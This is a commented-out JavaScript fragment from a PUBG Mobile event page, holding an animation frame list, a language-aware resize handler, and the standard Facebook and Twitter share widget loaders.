        // './images/part1_1/33.jpg',
        // './images/part1_1/34.jpg',
        // './images/part1_1/35.jpg',
        // './images/part1_1/36.jpg',
        // './images/part1_1/37.jpg',
        // './images/part1_1/38.jpg',
        // './images/part1_1/39.jpg',
// 
        // './images/part1_1/40.jpg',
        // './images/part1_1/41.jpg',
        // './images/part1_1/42.jpg',
        // './images/part1_1/43.jpg',
        // './images/part1_1/44.jpg',
        // './images/part1_1/45.jpg',
        // './images/part1_1/46.jpg',
        // './images/part1_1/47.jpg',
        // './images/part1_1/48.jpg',
        // './images/part1_1/49.jpg',
// 
        // './images/part1_1/50.jpg',
        // './images/part1_1/51.jpg',
        // './images/part1_1/52.jpg',
        // './images/part1_1/53.jpg',
        // './images/part1_1/54.jpg',
        // './images/part1_1/55.jpg',
        // './images/part1_1/56.jpg',
        // './images/part1_1/57.jpg',
        // './images/part1_1/58.jpg',
        // './images/part1_1/59.jpg',
// 
        // './images/part1_1/60.jpg',
        // './images/part1_1/61.jpg',
        // './images/part1_1/62.jpg',
        // './images/part1_1/63.jpg',
        // './images/part1_1/64.jpg',
        // './images/part1_1/65.jpg',
        // './images/part1_1/66.jpg',
        // './images/part1_1/67.jpg',
        // './images/part1_1/68.jpg',
        // './images/part1_1/69.jpg',
// 
        // './images/part1_1/70.jpg',
        // './images/part1_1/71.jpg',
        // './images/part1_1/72.jpg',
        // './images/part1_1/73.jpg',
        // './images/part1_1/74.jpg',
        // './images/part1_1/75.jpg',
        // './images/part1_1/76.jpg',
        // './images/part1_1/77.jpg',
        // './images/part1_1/78.jpg',
        // './images/part1_1/79.jpg',
// 
        // './images/part1_1/80.jpg',
        // './images/part1_1/81.jpg',
        // './images/part1_1/82.jpg',
        // './images/part1_1/83.jpg',
        // './images/part1_1/84.jpg',
        // './images/part1_1/85.jpg',
        // './images/part1_1/86.jpg',
        // './images/part1_1/87.jpg',
        // './images/part1_1/88.jpg',
        // './images/part1_1/89.jpg',
// 
        // './images/part1_1/90.jpg',
        // './images/part1_1/91.jpg',
        // './images/part1_1/92.jpg',
        // './images/part1_1/93.jpg',
        // './images/part1_1/94.jpg',
        // './images/part1_1/95.jpg',
        // './images/part1_1/96.jpg',
        // './images/part1_1/97.jpg',
        // './images/part1_1/98.jpg',
        // './images/part1_1/99.jpg',
// 
        // './images/part1_1/100.jpg',
    // ];
// 
    // preloadVideo(kv);
// 
    // /* åŠ è½½é¦–å±åŠ¨ç”»å¸§ e */
// 
    // /**
     // * é¡µé¢å¤§å°å‘ç”Ÿå˜åŒ–
     // */
    // window.resizefun = function() {
        // var wid = $(window).width();
        // // if (
        // //     /Android|webOS|iPhone|iPad|iPod|BlackBerry/i.test(navigator.userAgent) ||
        // //     wid <= 500
        // // ) {
        // // Mç«¯éšè—å¤´éƒ¨ã€åº•éƒ¨
        // $('body').addClass('mclass');
        // $('.footer').css('display', 'none');
        // $('.top-nav').css('display', 'none');
// 
        // // Mç«¯èŽ·å–å¤šè¯­è¨€çŽ¯å¢ƒ
        // var areaLan = ["ZH", "EN", "TW", "HK", "TH", "ES", "FR", "TR", "VI", "DE", "PT", "ID", "RU", "AR"];
// 
        // if (getQueryString("setLan") == null || $.trim(getQueryString("setLan")) == "") {
            // language = getQueryString("language") ? $.trim(getQueryString("language")).toUpperCase() : "EN";
            // if (areaLan.indexOf(language) < 0) {
                // language = "EN";
            // }
        // } else {
            // language = $.trim(getQueryString("setLan"));
        // }
// 
        // if ($(".pop-share").hasClass("pc")) {
            // $(".pop-share").removeClass("pc");
        // }
        // // } else {
        // //     // PCç«¯æ˜¾ç¤ºå¤´éƒ¨ã€åº•éƒ¨
        // //     $('body').removeClass('mclass');
        // //     $('.footer').css('display', 'block');
        // //     $('.top-nav').css('display', 'block');
// 
        // //     // PCç«¯ å¤šè¯­è¨€ï¼šæ›¿æ¢æ³•è€è½®æ’­ä¸Šçš„è§†é¢‘åç§°
        // //     language = $('html').attr("lang").toLowerCase();
        // //     $('.wrapper').addClass('lang-' + language.toLowerCase());
        // //     $(".pop-share").addClass("pc");
        // // }
// 
        // // å¤šè¯­è¨€ï¼šæ›¿æ¢æ³•è€è½®æ’­ä¸Šçš„è§†é¢‘åç§°
        // $(".sec2-player-text").each(function() {
            // $(this).attr('src', "./images/sec2_player_" + $(this).attr("data-player") + language.toLowerCase() + ".png");
        // });
// 
        // $(".sec3-title-pic").each(function() {
            // $(this).attr('src', "./images/sec3_gift_" + language.toLowerCase() + ".png");
        // });
    // };
// 
    // $(window)
        // .on('resize', resizefun)
        // .trigger('resize');
// 
    // window.addEventListener("contextmenu", function(e) {
        // e.preventDefault();
    // });
// 
    // $('.sec3-button-item.share').on('click', function() {
        // $('.b-bg').show();
        // $('.pop-vid,.pop-act').hide();
        // $('.pop-share').show();
    // });
    // // FACEBOOK
    // (function(d, s, id) {
        // var js,
            // fjs = d.getElementsByTagName(s)[0];
        // if (d.getElementById(id)) return;
        // js = d.createElement(s);
        // js.id = id;
        // js.src = 'https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v3.0';
        // fjs.parentNode.insertBefore(js, fjs);
    // })(document, 'script', 'facebook-jssdk');
// 
    // // TWITTER
    // window.twttr = (function(d, s, id) {
        // var js,
            // fjs = d.getElementsByTagName(s)[0],
            // t = window.twttr || {};
        // if (d.getElementById(id)) return t;
        // js = d.createElement(s);
        // js.id = id;
        // js.src = 'https://platform.twitter.com/widgets.js';
        // fjs.parentNode.insertBefore(js, fjs);
        // t._e = [];
        // t.ready = function(f) {
            // t._e.push(f);
        // };
        // return t;
    // })(document, 'script', 'twitter-wjs');
// 
    // // // share_btn
    // // $('.twitter-share-btn').attr(
    // //     'href',
    // //     'https://twitter.com/intent/tweet?original_referer=' +
    // //     encodeURIComponent(
    // //         'https://developer.twitter.com/en/docs/twitter-for-websites/tweet-button/overview.html&ref_src=twsrc^tfw&related=twitterapi,twitter'
    // //     ) +
    // //     '&text=' +
    // //     encodeURIComponent('{# æ ‡é¢˜ #}') +
    // //     '&url=' +
    // //     encodeURIComponent('https://www.pubgmobile.com/event/a20200622egyptm/')
    // // );
    // // $('.facebook-share-btn').attr(
    // //     'href',
    // //     'https://www.facebook.com/sharer/sharer.php?u=' +
    // //     encodeURIComponent('https://www.pubgmobile.com/event/a20200622egyptm/') +
    // //     '&src=sdkpreparse'
    // // );
// })();
// 
